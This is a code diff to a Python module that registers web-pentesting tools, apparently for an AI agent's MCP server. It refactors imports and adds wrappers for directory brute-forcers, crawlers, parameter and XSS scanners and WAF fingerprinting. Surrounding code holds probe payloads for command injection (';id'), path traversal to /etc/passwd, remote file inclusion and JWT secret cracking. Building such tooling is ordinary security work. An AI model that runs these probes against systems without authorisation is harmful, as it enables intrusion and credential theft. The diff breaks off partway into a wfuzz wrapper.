@@ -1,14 +1,22 @@
 import asyncio
+import base64
+import hashlib
+import hmac
 import json
+import os
 import re
 import shutil
+import tempfile
 import time
+import urllib.error
+import urllib.parse
+import urllib.request
 from pathlib import Path
 
 from mcp.types import Tool
 
 from .register_all import register
-from .recon import _run_subprocess, _save_artifact, _record_execution
+from ._helpers import _run_subprocess, _save_artifact, _record_execution
 
 
 async def _persist(project_id, tool_name: str, args: dict, stdout: str, stderr: str, exit_code: int):
@@ -627,7 +635,6 @@ async def _ssti_probe(args: dict) -> str:
     base_url = target if not param else target
     results = []
     for payload, expected in payloads:
-        import urllib.parse
         encoded = urllib.parse.quote(payload)
         if param:
             test_url = f"{target}?{param}={encoded}"
@@ -684,7 +691,6 @@ async def _lfi_probe(args: dict) -> str:
     ]
     results = []
     for payload in payloads:
-        import urllib.parse
         test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
         cmd = ["curl", "-sL", "-m", "10", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
@@ -738,7 +744,6 @@ async def _rfi_probe(args: dict) -> str:
         payloads.insert(0, f"http://{callback_host}/rfi_test.php")
     results = []
     for payload in payloads:
-        import urllib.parse
         test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
         cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=15)
@@ -834,7 +839,6 @@ async def _cmdi_probe(args: dict) -> str:
     param = (args.get("param") or "").strip()
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 60))
-    import urllib.parse
     payloads = [
         ";id",
         "|id",
@@ -895,7 +899,6 @@ async def _path_traversal(args: dict) -> str:
     param = (args.get("param") or "path").strip()
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 60))
-    import urllib.parse
     payloads = [
         "../../../etc/passwd",
         "../../../../etc/passwd",
@@ -1109,7 +1112,6 @@ register(
 # ---------------------------------------------------------------------------
 
 async def _jwt_decode(args: dict) -> str:
-    import base64
     token = (args.get("token") or "").strip()
     if not token:
         return "Error: token is required."
@@ -1166,7 +1168,6 @@ async def _jwt_crack(args: dict) -> str:
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 300))
     if shutil.which("hashcat"):
-        import tempfile, os
         with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as f:
             f.write(token)
             jwt_file = f.name
@@ -1182,14 +1183,13 @@ async def _jwt_crack(args: dict) -> str:
             return f"JWT cracked! Secret: {cracked.group(1).strip()}"
         return f"hashcat: no secret found.\n{stdout[-500:]}"
     # Fallback: Python brute-force
-    import hmac, hashlib as _hashlib, base64
     parts = token.split(".")
     if len(parts) != 3:
         return "Error: invalid JWT."
     header_payload = f"{parts[0]}.{parts[1]}".encode()
     sig_b64 = parts[2]
     def verify(secret: bytes) -> bool:
-        sig = hmac.new(secret, header_payload, _hashlib.sha256).digest()
+        sig = hmac.new(secret, header_payload, hashlib.sha256).digest()
         expected = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
         return expected == sig_b64
     try:
@@ -1482,7 +1482,7 @@ async def _clickjack_check(args: dict) -> str:
         return "Error: target is required."
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 15))
-    cmd = ["curl", "-sI", "-m", "10", target]
+    cmd = ["curl", "-sIL", "-m", "10", target]
     stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
     await _persist(project_id, "clickjack_check", args, stdout, stderr, exit_code)
     if exit_code == -1:
@@ -1622,8 +1622,7 @@ async def _auth_brute_http(args: dict) -> str:
     fail_str = (args.get("fail_str") or "Invalid").strip()
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 300))
-    from urllib.parse import urlparse
-    parsed = urlparse(target)
+    parsed = urllib.parse.urlparse(target)
     host = parsed.hostname or target
     scheme = "https-post-form" if parsed.scheme == "https" else "http-post-form"
     cmd = [
@@ -1673,7 +1672,7 @@ async def _csp_check(args: dict) -> str:
         return "Error: target is required."
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 15))
-    cmd = ["curl", "-sI", "-m", "10", target]
+    cmd = ["curl", "-sIL", "-m", "10", target]
     stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
     await _persist(project_id, "csp_check", args, stdout, stderr, exit_code)
     if exit_code == -1:
@@ -1865,12 +1864,17 @@ async def _csp_audit(args: dict) -> str:
     if rc == -1:
         return stderr
 
-    lines = stdout.splitlines()
+    # With -L curl prints headers for every redirect before the final response.
+    # Split on HTTP status lines and take only the LAST block so we parse the
+    # final response headers, not an intermediate redirect's headers.
+    http_blocks = re.split(r"(?m)^(?=HTTP/[12])", stdout)
+    last_block = next((b for b in reversed(http_blocks) if b.strip()), "")
+
     header_section = []
     body_lines = []
     in_body = False
-    for line in lines:
-        if line.strip() == "" and not in_body and header_section:
+    for line in last_block.splitlines():
+        if line.strip() == "" and not in_body:
             in_body = True
             continue
         if in_body:
@@ -1934,8 +1938,7 @@ async def _csp_audit(args: dict) -> str:
 
     # SRI check — look for <script> tags without integrity attributes in body
     body = "\n".join(body_lines)
-    import re as _re
-    script_tags = _re.findall(r"<script[^>]*src=['\"][^'\"]+['\"][^>]*>", body, _re.IGNORECASE)
+    script_tags = re.findall(r"<script[^>]*src=['\"][^'\"]+['\"][^>]*>", body, re.IGNORECASE)
     no_sri = [t for t in script_tags if "integrity=" not in t.lower()]
     if no_sri:
         findings.append(f"\nSRI MISSING on {len(no_sri)} external script tag(s):")
@@ -2078,22 +2081,24 @@ async def _crawler_login(args: dict) -> str:
     session_cookie = ""
     login_status = "skipped (no login_url provided)"
     if login_url:
-        import urllib.request, urllib.parse, urllib.error
         try:
-            cj = {}
             post_data = urllib.parse.urlencode({"username": username, "password": password, "email": username}).encode()
-            req = urllib.request.Request(login_url, data=post_data, method="POST")
-            req.add_header("User-Agent", "penligent-crawler/0.1")
-            req.add_header("Content-Type", "application/x-www-form-urlencoded")
-            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
-            with opener.open(req, timeout=timeout) as resp:
-                for h in resp.headers.get_all("Set-Cookie") or []:
-                    cookie_part = h.split(";")[0].strip()
-                    if "=" in cookie_part:
-                        k, v = cookie_part.split("=", 1)
-                        cj[k.strip()] = v.strip()
-                login_status = f"POST {login_url} → {resp.status}"
+            def _do_login(pd=post_data):
+                req = urllib.request.Request(login_url, data=pd, method="POST")
+                req.add_header("User-Agent", "penligent-crawler/0.1")
+                req.add_header("Content-Type", "application/x-www-form-urlencoded")
+                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
+                cookies = {}
+                with opener.open(req, timeout=timeout) as resp:
+                    for h in resp.headers.get_all("Set-Cookie") or []:
+                        cookie_part = h.split(";")[0].strip()
+                        if "=" in cookie_part:
+                            k, v = cookie_part.split("=", 1)
+                            cookies[k.strip()] = v.strip()
+                    return cookies, f"POST {login_url} → {resp.status}"
+            cj, login_status = await asyncio.to_thread(_do_login)
         except Exception as e:
+            cj = {}
             login_status = f"Login failed: {e}"
 
         session_cookie = "; ".join(f"{k}={v}" for k, v in cj.items())
@@ -2117,7 +2122,6 @@ async def _crawler_login(args: dict) -> str:
     results.append("")
     results.append("Authenticated crawl results:")
     interesting = []
-    import urllib.request, urllib.error
     for path in _PATHS:
         url = target + path
         req = urllib.request.Request(url)
@@ -2125,14 +2129,14 @@ async def _crawler_login(args: dict) -> str:
         if session_cookie:
             req.add_header("Cookie", session_cookie)
         try:
-            with urllib.request.urlopen(req, timeout=timeout) as resp:
-                code = resp.status
-                ct = resp.headers.get("Content-Type", "")[:40]
-                size = len(resp.read(512))
-                line = f"  {code}  {path:35} {ct}"
-                if code in (200, 201) or size > 100:
-                    interesting.append(line)
-                results.append(line)
+            def _do_req(r=req):
+                with urllib.request.urlopen(r, timeout=timeout) as resp:
+                    return resp.status, resp.headers.get("Content-Type", "")[:40], len(resp.read(512))
+            code, ct, size = await asyncio.to_thread(_do_req)
+            line = f"  {code}  {path:35} {ct}"
+            if code in (200, 201) or size > 100:
+                interesting.append(line)
+            results.append(line)
         except urllib.error.HTTPError as e:
             code = e.code
             line = f"  {code}  {path}"
@@ -2178,7 +2182,8 @@ register(
 
 
 # ---------------------------------------------------------------------------
-# check_sensitive_paths — Crawlergo 40-path heuristic (verbatim)
+# feroxbuster_scan  — (check_sensitive_paths and auth_replay live in
+#                      guardrails.py and utils.py respectively)
 # ---------------------------------------------------------------------------
 
 _SENSITIVE_PATHS = [
@@ -2194,150 +2199,549 @@ _SENSITIVE_PATHS = [
 ]
 
 
-async def _check_sensitive_paths(args: dict) -> str:
-    import urllib.request, urllib.error as _ue
+# ---------------------------------------------------------------------------
+# feroxbuster_scan  (recursive content discovery)
+# ---------------------------------------------------------------------------
 
-    target = (args.get("target") or "").strip().rstrip("/")
-    if not target:
-        return "Error: target is required."
+async def _feroxbuster_scan(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    wordlist = (args.get("wordlist") or "/usr/share/wordlists/dirb/common.txt").strip()
+    threads = int(args.get("threads", 10))
+    extensions = (args.get("extensions") or "").strip()
+    extra = (args.get("additional_args") or "").strip()
     project_id = args.get("project_id")
-    use_prefixes = bool(args.get("use_prefixes", False))
-    timeout_s = int(args.get("timeout", 30))
+    timeout_s = int(args.get("timeout", 300))
 
-    paths = list(_SENSITIVE_PATHS)
-    if use_prefixes:
-        for extra in ["/api/v3", "/api/v4", "/v1", "/v2", "/v3"]:
-            if extra not in paths:
-                paths.append(extra)
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("feroxbuster"):
+        return "Error: feroxbuster not found in PATH. Install: apt install feroxbuster"
 
-    results = []
-    interesting = []
-    for path in paths:
-        url = target + path
-        req = urllib.request.Request(url)
-        req.add_header("User-Agent", "Mozilla/5.0 penligent-probe/0.1")
-        try:
-            with urllib.request.urlopen(req, timeout=timeout_s) as resp:
-                code = resp.status
-                ct = resp.headers.get("Content-Type", "")[:40]
-                body = resp.read(256)
-                line = f"  {code}  {path:<35} [{len(body)}b] {ct}"
-                results.append(line)
-                if code in (200, 201, 301, 302) or len(body) > 100:
-                    interesting.append(line)
-        except _ue.HTTPError as e:
-            line = f"  {e.code}  {path}"
-            results.append(line)
-            if e.code in (401, 403):
-                interesting.append(line)
-        except Exception as ex:
-            results.append(f"  ERR  {path}  ({type(ex).__name__})")
+    cmd = ["feroxbuster", "-u", url, "-w", wordlist, "-t", str(threads), "--no-state"]
+    if extensions:
+        cmd += ["-x", extensions]
+    if extra:
+        cmd += extra.split()
 
-    output_lines = [f"check_sensitive_paths: {target}", ""] + results
-    if interesting:
-        output_lines += ["", f"Interesting ({len(interesting)}):"] + interesting
-
-    output = "\n".join(output_lines)
-    await _persist(project_id, "check_sensitive_paths", args, output, "", 0)
-    return output
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "feroxbuster_scan", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or f"Feroxbuster scan completed for {url} with no results."
 
 
 register(
     Tool(
-        name="check_sensitive_paths",
-        description=(
-            "Probe 40 high-value paths (Crawlergo heuristic) on a target URL. "
-            "Returns HTTP status codes; highlights 200/401/403 responses. "
-            "Passive — no approve_intent needed. Set use_prefixes=true for versioned APIs."
-        ),
+        name="feroxbuster_scan",
+        description="Recursive directory and file brute-forcing with Feroxbuster. Automatically recurses into discovered directories. Faster than gobuster for deep content discovery.",
         inputSchema={
             "type": "object",
-            "required": ["target"],
+            "required": ["url"],
             "properties": {
-                "target": {"type": "string", "description": "Base URL, e.g. http://10.10.11.22"},
-                "use_prefixes": {"type": "boolean", "description": "Add /api/v3, /api/v4, /v1-3 variants"},
+                "url": {"type": "string", "description": "Target URL"},
+                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
+                "threads": {"type": "integer", "description": "Concurrent threads (default: 10)"},
+                "extensions": {"type": "string", "description": "File extensions to append (e.g. 'php,html,txt')"},
+                "additional_args": {"type": "string", "description": "Extra feroxbuster flags (e.g. '--filter-status 404', '--depth 3')"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 300)"},
                 "project_id": {"type": "integer"},
-                "timeout": {"type": "integer", "description": "Per-request timeout in seconds (default 30)"},
             },
         },
     ),
-    _check_sensitive_paths,
+    _feroxbuster_scan,
 )
 
 
 # ---------------------------------------------------------------------------
-# auth_replay — replay a captured token against an endpoint
+# dirsearch_scan  (advanced directory and file discovery)
 # ---------------------------------------------------------------------------
 
-async def _auth_replay(args: dict) -> str:
-    import urllib.request, urllib.error as _ue, json as _json
-
-    endpoint = (args.get("endpoint") or "").strip()
-    token = (args.get("token") or "").strip()
-    headers_raw = args.get("headers_json", "{}")
-    method = (args.get("method") or "GET").upper()
+async def _dirsearch_scan(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    extensions = (args.get("extensions") or "php,html,js,txt,xml,json").strip()
+    wordlist = (args.get("wordlist") or "").strip()
+    threads = int(args.get("threads", 30))
+    recursive = bool(args.get("recursive", False))
+    extra = (args.get("additional_args") or "").strip()
     project_id = args.get("project_id")
-    timeout_s = int(args.get("timeout", 30))
+    timeout_s = int(args.get("timeout", 300))
 
-    if not endpoint:
-        return "Error: endpoint is required."
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("dirsearch"):
+        return "Error: dirsearch not found in PATH. Install: apt install dirsearch"
 
-    try:
-        extra_headers = _json.loads(headers_raw) if isinstance(headers_raw, str) else (headers_raw or {})
-    except Exception:
-        extra_headers = {}
+    cmd = ["dirsearch", "-u", url, "-e", extensions, "-t", str(threads)]
+    if wordlist:
+        cmd += ["-w", wordlist]
+    if recursive:
+        cmd.append("-r")
+    if extra:
+        cmd += extra.split()
 
-    req = urllib.request.Request(endpoint, method=method)
-    req.add_header("User-Agent", "penligent-auth-replay/0.1")
-    if token:
-        req.add_header("Authorization", f"Bearer {token}")
-    for k, v in extra_headers.items():
-        req.add_header(str(k), str(v))
-
-    interesting_hdrs = ("content-type", "x-user", "x-role", "set-cookie", "location", "www-authenticate", "x-auth-token")
-
-    try:
-        with urllib.request.urlopen(req, timeout=timeout_s) as resp:
-            code = resp.status
-            body = resp.read(4096).decode("utf-8", errors="replace")
-            resp_hdrs = {k: v for k, v in resp.headers.items() if k.lower() in interesting_hdrs}
-            result = (
-                f"auth_replay: {method} {endpoint}\n"
-                f"Status: {code}\n"
-                f"Headers: {_json.dumps(resp_hdrs, indent=2)}\n"
-                f"Body ({len(body)} chars):\n{body[:2048]}"
-            )
-    except _ue.HTTPError as e:
-        body = e.read(2048).decode("utf-8", errors="replace")
-        result = f"auth_replay: {method} {endpoint}\nStatus: {e.code}\nBody:\n{body[:2048]}"
-    except Exception as ex:
-        result = f"auth_replay error: {ex}"
-
-    await _persist(project_id, "auth_replay", args, result, "", 0)
-    return result
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "dirsearch_scan", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or f"Dirsearch completed for {url} with no results."
 
 
 register(
     Tool(
-        name="auth_replay",
-        description=(
-            "Replay a captured token/session against an endpoint. "
-            "Sends a request with Authorization: Bearer <token> and any extra headers. "
-            "Use to verify token invalidation after logout, test privilege escalation, "
-            "or confirm session fixation. Returns status code, relevant response headers, and body preview."
-        ),
+        name="dirsearch_scan",
+        description="Advanced web directory brute-forcing with Dirsearch. Supports multiple extensions, recursive scanning, and smart filtering. Good for API endpoint discovery.",
         inputSchema={
             "type": "object",
-            "required": ["endpoint"],
+            "required": ["url"],
             "properties": {
-                "endpoint": {"type": "string", "description": "Full URL to replay the token against"},
-                "token": {"type": "string", "description": "Bearer token / JWT to replay"},
-                "method": {"type": "string", "description": "HTTP method (default GET)"},
-                "headers_json": {"type": "string", "description": "JSON object of extra headers to send"},
+                "url": {"type": "string", "description": "Target URL"},
+                "extensions": {"type": "string", "description": "File extensions (default: php,html,js,txt,xml,json)"},
+                "wordlist": {"type": "string", "description": "Custom wordlist path"},
+                "threads": {"type": "integer", "description": "Threads (default: 30)"},
+                "recursive": {"type": "boolean", "description": "Recursive scanning (default: false)"},
+                "additional_args": {"type": "string", "description": "Extra dirsearch flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 300)"},
                 "project_id": {"type": "integer"},
-                "timeout": {"type": "integer", "description": "Timeout in seconds (default 30)"},
             },
         },
     ),
-    _auth_replay,
+    _dirsearch_scan,
+)
+
+
+# ---------------------------------------------------------------------------
+# katana_crawl  (next-generation web crawler)
+# ---------------------------------------------------------------------------
+
+async def _katana_crawl(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    depth = int(args.get("depth", 3))
+    js_crawl = bool(args.get("js_crawl", True))
+    form_extraction = bool(args.get("form_extraction", True))
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("katana"):
+        return "Error: katana not found in PATH. Install: go install github.com/projectdiscovery/katana/cmd/katana@latest"
+
+    cmd = ["katana", "-u", url, "-d", str(depth), "-jsonl"]
+    if js_crawl:
+        cmd.append("-jc")
+    if form_extraction:
+        cmd.append("-fx")
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "katana_crawl", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    count = len(stdout.splitlines())
+    return f"Crawled {count} URLs from {url}:\n\n{stdout}" if stdout else (stderr or f"No URLs discovered from {url}.")
+
+
+register(
+    Tool(
+        name="katana_crawl",
+        description="Next-generation web crawling with Katana. Discovers endpoints including JavaScript-rendered content, forms, and API calls. Excellent for mapping attack surface.",
+        inputSchema={
+            "type": "object",
+            "required": ["url"],
+            "properties": {
+                "url": {"type": "string", "description": "Target URL to crawl"},
+                "depth": {"type": "integer", "description": "Crawl depth (default: 3)"},
+                "js_crawl": {"type": "boolean", "description": "Enable JavaScript crawling (default: true)"},
+                "form_extraction": {"type": "boolean", "description": "Extract form fields (default: true)"},
+                "additional_args": {"type": "string", "description": "Extra katana flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _katana_crawl,
+)
+
+
+# ---------------------------------------------------------------------------
+# gau_urls  (get all URLs from public archives)
+# ---------------------------------------------------------------------------
+
+async def _gau_urls(args: dict) -> str:
+    domain = (args.get("domain") or "").strip()
+    include_subs = bool(args.get("include_subs", True))
+    blacklist = (args.get("blacklist") or "png,jpg,gif,jpeg,swf,woff,svg,pdf,css,ico").strip()
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not domain:
+        return "Error: domain is required."
+    if not shutil.which("gau"):
+        return "Error: gau not found in PATH. Install: go install github.com/lc/gau/v2/cmd/gau@latest"
+
+    cmd = ["gau", domain]
+    if include_subs:
+        cmd.append("--subs")
+    if blacklist:
+        cmd += ["--blacklist", blacklist]
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "gau_urls", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    count = len(stdout.splitlines())
+    return f"Discovered {count} historical URLs for {domain}:\n\n{stdout[:5000]}" + ("\n... (truncated)" if len(stdout) > 5000 else "") if stdout else (stderr or "No URLs found.")
+
+
+register(
+    Tool(
+        name="gau_urls",
+        description="Fetch historical URLs for a domain from Wayback Machine, Common Crawl, OTX, and URLScan using gau (Get All URLs). Great for finding hidden endpoints and forgotten assets.",
+        inputSchema={
+            "type": "object",
+            "required": ["domain"],
+            "properties": {
+                "domain": {"type": "string", "description": "Target domain (e.g. example.com)"},
+                "include_subs": {"type": "boolean", "description": "Include subdomains (default: true)"},
+                "blacklist": {"type": "string", "description": "Comma-separated extensions to exclude (default: common static files)"},
+                "additional_args": {"type": "string", "description": "Extra gau flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _gau_urls,
+)
+
+
+# ---------------------------------------------------------------------------
+# waybackurls_discover  (Wayback Machine URL discovery)
+# ---------------------------------------------------------------------------
+
+async def _waybackurls_discover(args: dict) -> str:
+    domain = (args.get("domain") or "").strip()
+    get_versions = bool(args.get("get_versions", False))
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not domain:
+        return "Error: domain is required."
+    if not shutil.which("waybackurls"):
+        return "Error: waybackurls not found in PATH. Install: go install github.com/tomnomnom/waybackurls@latest"
+
+    cmd = ["waybackurls", domain]
+    if get_versions:
+        cmd.append("--get-versions")
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "waybackurls_discover", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    count = len(stdout.splitlines())
+    return f"Found {count} archived URLs for {domain}:\n\n{stdout[:5000]}" + ("\n... (truncated)" if len(stdout) > 5000 else "") if stdout else (stderr or "No archived URLs found.")
+
+
+register(
+    Tool(
+        name="waybackurls_discover",
+        description="Discover historical URLs from the Wayback Machine (archive.org) using waybackurls. Uncovers old endpoints, forgotten APIs, and removed pages.",
+        inputSchema={
+            "type": "object",
+            "required": ["domain"],
+            "properties": {
+                "domain": {"type": "string", "description": "Target domain (e.g. example.com)"},
+                "get_versions": {"type": "boolean", "description": "Also fetch timestamped versions of pages (default: false)"},
+                "additional_args": {"type": "string", "description": "Extra waybackurls flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _waybackurls_discover,
+)
+
+
+# ---------------------------------------------------------------------------
+# arjun_params  (HTTP parameter discovery)
+# ---------------------------------------------------------------------------
+
+async def _arjun_params(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    method = (args.get("method") or "GET").strip().upper()
+    wordlist = (args.get("wordlist") or "").strip()
+    threads = int(args.get("threads", 25))
+    stable = bool(args.get("stable", False))
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("arjun"):
+        return "Error: arjun not found in PATH. Install: pip install arjun"
+
+    cmd = ["arjun", "-u", url, "-m", method, "-t", str(threads)]
+    if wordlist:
+        cmd += ["-w", wordlist]
+    if stable:
+        cmd.append("--stable")
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "arjun_params", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or f"Arjun found no hidden parameters for {url}."
+
+
+register(
+    Tool(
+        name="arjun_params",
+        description="HTTP parameter discovery with Arjun. Finds hidden GET/POST/JSON parameters that are not in the HTML. Essential for finding attack surface in APIs.",
+        inputSchema={
+            "type": "object",
+            "required": ["url"],
+            "properties": {
+                "url": {"type": "string", "description": "Target URL"},
+                "method": {"type": "string", "description": "HTTP method: GET, POST, JSON (default: GET)"},
+                "wordlist": {"type": "string", "description": "Custom parameter wordlist"},
+                "threads": {"type": "integer", "description": "Concurrent threads (default: 25)"},
+                "stable": {"type": "boolean", "description": "Use stable mode (slower but more accurate, default: false)"},
+                "additional_args": {"type": "string", "description": "Extra arjun flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _arjun_params,
+)
+
+
+# ---------------------------------------------------------------------------
+# hakrawler_crawl  (fast web endpoint discovery)
+# ---------------------------------------------------------------------------
+
+async def _hakrawler_crawl(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    depth = int(args.get("depth", 2))
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("hakrawler"):
+        return "Error: hakrawler not found in PATH. Install: go install github.com/hakluke/hakrawler@latest"
+
+    # hakrawler reads URLs from stdin (v2+ interface)
+    proc = await asyncio.create_subprocess_exec(
+        "hakrawler", "-d", str(depth),
+        *(extra.split() if extra else []),
+        stdin=asyncio.subprocess.PIPE,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+    try:
+        stdout_b, stderr_b = await asyncio.wait_for(
+            proc.communicate(input=url.encode()),
+            timeout=timeout_s,
+        )
+    except asyncio.TimeoutError:
+        proc.kill()
+        await proc.communicate()
+        return f"Hakrawler timed out after {timeout_s}s."
+
+    stdout = stdout_b.decode(errors="replace")
+    stderr = stderr_b.decode(errors="replace")
+    exit_code = proc.returncode if proc.returncode is not None else 0
+
+    await _persist(project_id, "hakrawler_crawl", args, stdout, stderr, exit_code)
+    count = len(stdout.splitlines())
+    return f"Discovered {count} endpoints for {url}:\n\n{stdout}" if stdout else (stderr or "No endpoints found.")
+
+
+register(
+    Tool(
+        name="hakrawler_crawl",
+        description="Fast web endpoint discovery with Hakrawler. Crawls a site and extracts URLs, forms, JavaScript files, and endpoints. Useful for quick attack surface mapping.",
+        inputSchema={
+            "type": "object",
+            "required": ["url"],
+            "properties": {
+                "url": {"type": "string", "description": "Target URL to crawl"},
+                "depth": {"type": "integer", "description": "Crawl depth (default: 2)"},
+                "additional_args": {"type": "string", "description": "Extra hakrawler flags (e.g. '-subs' for subdomains)"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _hakrawler_crawl,
+)
+
+
+# ---------------------------------------------------------------------------
+# dalfox_xss  (advanced XSS scanner)
+# ---------------------------------------------------------------------------
+
+async def _dalfox_xss(args: dict) -> str:
+    url = (args.get("url") or "").strip()
+    mining_dom = bool(args.get("mining_dom", True))
+    mining_dict = bool(args.get("mining_dict", True))
+    custom_payload = (args.get("custom_payload") or "").strip()
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 120))
+
+    if not url:
+        return "Error: url is required."
+    if not shutil.which("dalfox"):
+        return "Error: dalfox not found in PATH. Install: go install github.com/hahwul/dalfox/v2@latest"
+
+    cmd = ["dalfox", "url", url]
+    if mining_dom:
+        cmd.append("--mining-dom")
+    if mining_dict:
+        cmd.append("--mining-dict")
+    if custom_payload:
+        cmd += ["--custom-payload", custom_payload]
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "dalfox_xss", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or f"Dalfox XSS scan completed for {url} with no findings."
+
+
+register(
+    Tool(
+        name="dalfox_xss",
+        description="Advanced XSS vulnerability scanning with Dalfox. Mines DOM-based XSS, reflects, and parameter-based XSS. Smarter than basic XSS scanners with context-aware payloads.",
+        inputSchema={
+            "type": "object",
+            "required": ["url"],
+            "properties": {
+                "url": {"type": "string", "description": "Target URL (include FUZZ marker in params, e.g. ?q=FUZZ)"},
+                "mining_dom": {"type": "boolean", "description": "Mine DOM-based XSS (default: true)"},
+                "mining_dict": {"type": "boolean", "description": "Mine parameters from dictionary (default: true)"},
+                "custom_payload": {"type": "string", "description": "Custom XSS payload to test"},
+                "additional_args": {"type": "string", "description": "Extra dalfox flags (e.g. '--blind your.xss.ht')"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _dalfox_xss,
+)
+
+
+# ---------------------------------------------------------------------------
+# wafw00f_detect  (WAF detection and fingerprinting)
+# ---------------------------------------------------------------------------
+
+async def _wafw00f_detect(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    find_all = bool(args.get("find_all", False))
+    extra = (args.get("additional_args") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 60))
+
+    if not target:
+        return "Error: target is required."
+    if not shutil.which("wafw00f"):
+        return "Error: wafw00f not found in PATH. Install: pip install wafw00f"
+
+    cmd = ["wafw00f", target]
+    if find_all:
+        cmd.append("-a")
+    if extra:
+        cmd += extra.split()
+
+    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+    await _persist(project_id, "wafw00f_detect", args, stdout, stderr, exit_code)
+    if exit_code == -1:
+        return stderr
+    return stdout or stderr or f"wafw00f completed for {target}."
+
+
+register(
+    Tool(
+        name="wafw00f_detect",
+        description="Detect and fingerprint Web Application Firewalls (WAF) with wafw00f. Identifies the WAF vendor and type to plan bypass strategies.",
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "Target URL (e.g. http://example.com)"},
+                "find_all": {"type": "boolean", "description": "Test for all known WAFs, not just the first detected (default: false)"},
+                "additional_args": {"type": "string", "description": "Extra wafw00f flags"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 60)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _wafw00f_detect,
+)
+
+
+# ---------------------------------------------------------------------------
+# wfuzz_scan  (web application fuzzer)
+# ---------------------------------------------------------------------------
+
+async def _wfuzz_scan(args: dict) -> str:
+    url = (args.get("url") or "").strip()
